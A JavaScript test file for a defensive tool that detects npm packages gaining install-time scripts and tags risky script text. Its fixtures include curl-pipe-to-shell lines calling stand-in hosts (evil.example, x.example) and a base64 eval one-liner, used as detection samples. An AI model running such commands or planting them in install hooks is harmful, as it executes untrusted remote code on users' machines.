import test from "node:test";
import assert from "node:assert/strict";
import {
  classifyScriptRisk,
  parseSnapshot,
  diffSnapshots,
  summarizeDiff,
  currentlyScripted,
  KNOWN_INCIDENTS,
  LIFECYCLE_SCRIPT_KEYS,
} from "./engine.mjs";

test("LIFECYCLE_SCRIPT_KEYS names the four install-time scripts", () => {
  assert.deepEqual(LIFECYCLE_SCRIPT_KEYS, ["preinstall", "install", "postinstall", "prepare"]);
});

test("classifyScriptRisk: flags a curl-pipe-to-shell pattern", () => {
  assert.deepEqual(classifyScriptRisk("curl https://evil.example/x.sh | sh"), [
    "pipes-a-download-to-a-shell",
    "makes-a-network-call",
  ]);
});

test("classifyScriptRisk: flags obfuscation", () => {
  assert.deepEqual(classifyScriptRisk("node -e \"eval(Buffer.from('...','base64').toString())\""), [
    "obfuscated-or-encoded",
  ]);
});

test("classifyScriptRisk: a plain build step is not flagged", () => {
  assert.deepEqual(classifyScriptRisk("node-gyp rebuild"), []);
  assert.deepEqual(classifyScriptRisk("tsc -p tsconfig.build.json"), []);
});

test("classifyScriptRisk: empty or missing text is not flagged", () => {
  assert.deepEqual(classifyScriptRisk(""), []);
  assert.deepEqual(classifyScriptRisk(undefined), []);
});

test("KNOWN_INCIDENTS carries dated, sourced events and nothing undated", () => {
  assert.ok(KNOWN_INCIDENTS.length >= 3);
  for (const row of KNOWN_INCIDENTS) {
    assert.match(row.date, /^\d{4}-\d{2}(-\d{2})?$/, `${row.project} is missing a real date`);
    assert.ok(row.mechanism && row.note);
  }
  const projects = KNOWN_INCIDENTS.map((r) => r.project);
  assert.ok(projects.some((p) => p.includes("ua-parser-js")));
  assert.ok(projects.some((p) => p.includes("Shai-Hulud")));
});

test("parseSnapshot: package-lock.json (lockfileVersion 3) packages map", () => {
  const lockfile = JSON.stringify({
    name: "my-app",
    lockfileVersion: 3,
    packages: {
      "": { name: "my-app", version: "1.0.0" },
      "node_modules/left-pad": { version: "1.3.0" },
      "node_modules/node-sass": { version: "9.0.0", hasInstallScript: true },
      "node_modules/@scope/widget": { version: "2.0.0", hasInstallScript: true },
    },
  });
  const list = parseSnapshot(lockfile);
  assert.deepEqual(list, [
    { name: "@scope/widget", version: "2.0.0", hasInstallScript: true, scripts: null, riskTags: [] },
    { name: "left-pad", version: "1.3.0", hasInstallScript: false, scripts: null, riskTags: [] },
    { name: "node-sass", version: "9.0.0", hasInstallScript: true, scripts: null, riskTags: [] },
  ]);
});

test("parseSnapshot: lockfileVersion 1 (no packages map) throws a clear, actionable error", () => {
  const v1 = JSON.stringify({ name: "my-app", lockfileVersion: 1, dependencies: { "left-pad": { version: "1.3.0" } } });
  assert.throws(() => parseSnapshot(v1), /lockfileVersion 1/);
});

test("parseSnapshot: JSON array from cli.mjs snapshot, with script text and risk classification", () => {
  const list = parseSnapshot(JSON.stringify([
    { name: "clean-pkg", version: "1.0.0", scripts: {} },
    { name: "builds-native", version: "2.0.0", scripts: { install: "node-gyp rebuild" } },
    { name: "suspicious-pkg", version: "1.2.0", scripts: { postinstall: "curl https://x.example/p.sh | sh" } },
  ]));
  assert.deepEqual(list, [
    { name: "builds-native", version: "2.0.0", hasInstallScript: true, scripts: { install: "node-gyp rebuild" }, riskTags: [] },
    { name: "clean-pkg", version: "1.0.0", hasInstallScript: false, scripts: null, riskTags: [] },
    {
      name: "suspicious-pkg",
      version: "1.2.0",
      hasInstallScript: true,
      scripts: { postinstall: "curl https://x.example/p.sh | sh" },
      riskTags: ["pipes-a-download-to-a-shell", "makes-a-network-call"],
    },
  ]);
});

test("parseSnapshot: simplified {name, version, hasInstallScript} array", () => {
  const list = parseSnapshot(JSON.stringify([{ name: "x", version: "1.0.0", hasInstallScript: true }]));
  assert.deepEqual(list, [{ name: "x", version: "1.0.0", hasInstallScript: true, scripts: null, riskTags: [] }]);
});

test("parseSnapshot: rejects invalid JSON with a clear error", () => {
  assert.throws(() => parseSnapshot("[not json"), /not valid JSON/);
});

test("parseSnapshot: rejects a shape that is neither a lockfile nor an array", () => {
  assert.throws(() => parseSnapshot(JSON.stringify({ hello: "world" })), /expected a package-lock\.json/);
});

test("parseSnapshot: empty input is an empty snapshot, not an error", () => {
  assert.deepEqual(parseSnapshot(""), []);
  assert.deepEqual(parseSnapshot("   \n  "), []);
});

test("parseSnapshot: duplicate names, last occurrence wins", () => {
  const list = parseSnapshot(JSON.stringify([
    { name: "x", version: "1.0.0", hasInstallScript: false },
    { name: "x", version: "2.0.0", hasInstallScript: true },
  ]));
  assert.deepEqual(list, [{ name: "x", version: "2.0.0", hasInstallScript: true, scripts: null, riskTags: [] }]);
});

test("diffSnapshots: a package gaining a script is the headline case", () => {
  const baseline = parseSnapshot(JSON.stringify([
    { name: "stable-pkg", version: "1.0.0", hasInstallScript: false },
    { name: "about-to-turn", version: "1.2.0", hasInstallScript: false },
    { name: "dropped-pkg", version: "0.5.0", hasInstallScript: false },
  ]));
  const current = parseSnapshot(JSON.stringify([
    { name: "stable-pkg", version: "1.0.1", hasInstallScript: false },
    { name: "about-to-turn", version: "2.0.0", hasInstallScript: true },
    { name: "brand-new-pkg", version: "1.0.0", hasInstallScript: true },
  ]));
  const result = diffSnapshots(baseline, current);

  assert.equal(result.unchanged, 1);
  assert.equal(result.removed.length, 1);
  assert.equal(result.removed[0].name, "dropped-pkg");
  assert.equal(result.added.length, 1);
  assert.equal(result.added[0].name, "brand-new-pkg");
  assert.equal(result.added[0].hasInstallScript, true);
  assert.equal(result.changed.length, 1);
  assert.equal(result.changed[0].name, "about-to-turn");
  assert.equal(result.changed[0].kind, "gained");
});

test("diffSnapshots: a version bump alone (no script change) is unchanged", () => {
  const baseline = parseSnapshot(JSON.stringify([{ name: "x", version: "1.0.0", hasInstallScript: false }]));
  const current = parseSnapshot(JSON.stringify([{ name: "x", version: "1.5.0", hasInstallScript: false }]));
  const result = diffSnapshots(baseline, current);
  assert.equal(result.unchanged, 1);
  assert.equal(result.changed.length, 0);
});

test("diffSnapshots: losing a script is reported as 'lost', not 'gained'", () => {
  const baseline = parseSnapshot(JSON.stringify([{ name: "x", version: "1.0.0", hasInstallScript: true }]));
  const current = parseSnapshot(JSON.stringify([{ name: "x", version: "2.0.0", hasInstallScript: false }]));
  const result = diffSnapshots(baseline, current);
  assert.equal(result.changed.length, 1);
  assert.equal(result.changed[0].kind, "lost");
});

test("diffSnapshots: script text changing while staying present is 'modified'", () => {
  const baseline = parseSnapshot(JSON.stringify([{ name: "x", version: "1.0.0", scripts: { postinstall: "node build.js" } }]));
  const current = parseSnapshot(JSON.stringify([{ name: "x", version: "1.0.1", scripts: { postinstall: "node build.js --extra" } }]));
  const result = diffSnapshots(baseline, current);
  assert.equal(result.changed.length, 1);
  assert.equal(result.changed[0].kind, "modified");
});

test("diffSnapshots: --ignore moves a gained script out of the fail-worthy list", () => {
  const baseline = parseSnapshot(JSON.stringify([{ name: "accepted", version: "1.0.0", hasInstallScript: false }]));
  const current = parseSnapshot(JSON.stringify([{ name: "accepted", version: "2.0.0", hasInstallScript: true }]));
  const result = diffSnapshots(baseline, current, { ignore: ["Accepted"] });
  assert.equal(result.changed.length, 0);
  assert.equal(result.ignoredChanges.length, 1);
  assert.equal(result.ignoredChanges[0].kind, "gained");
});

test("summarizeDiff: newly-scripted packages are the headline, not just any change", () => {
  const gained = diffSnapshots(
    parseSnapshot(JSON.stringify([{ name: "x", version: "1.0.0", hasInstallScript: false }])),
    parseSnapshot(JSON.stringify([{ name: "x", version: "1.0.0", hasInstallScript: true }])),
  );
  assert.equal(summarizeDiff(gained).status, "changed");
  assert.match(summarizeDiff(gained).text, /now run an install-time script/);

  const clean = diffSnapshots(
    parseSnapshot(JSON.stringify([{ name: "x", version: "1.0.0", hasInstallScript: false }])),
    parseSnapshot(JSON.stringify([{ name: "x", version: "1.0.1", hasInstallScript: false }])),
  );
  assert.equal(summarizeDiff(clean).status, "ok");
});

test("currentlyScripted: lists only the scripted packages, riskiest first", () => {
  const list = parseSnapshot(JSON.stringify([
    { name: "clean", version: "1.0.0", hasInstallScript: false },
    { name: "quiet-script", version: "1.0.0", scripts: { postinstall: "node build.js" } },
    { name: "loud-script", version: "1.0.0", scripts: { postinstall: "curl https://x.example/p.sh | sh" } },
  ]));
  const scripted = currentlyScripted(list);
  assert.deepEqual(scripted.map((e) => e.name), ["loud-script", "quiet-script"]);
});
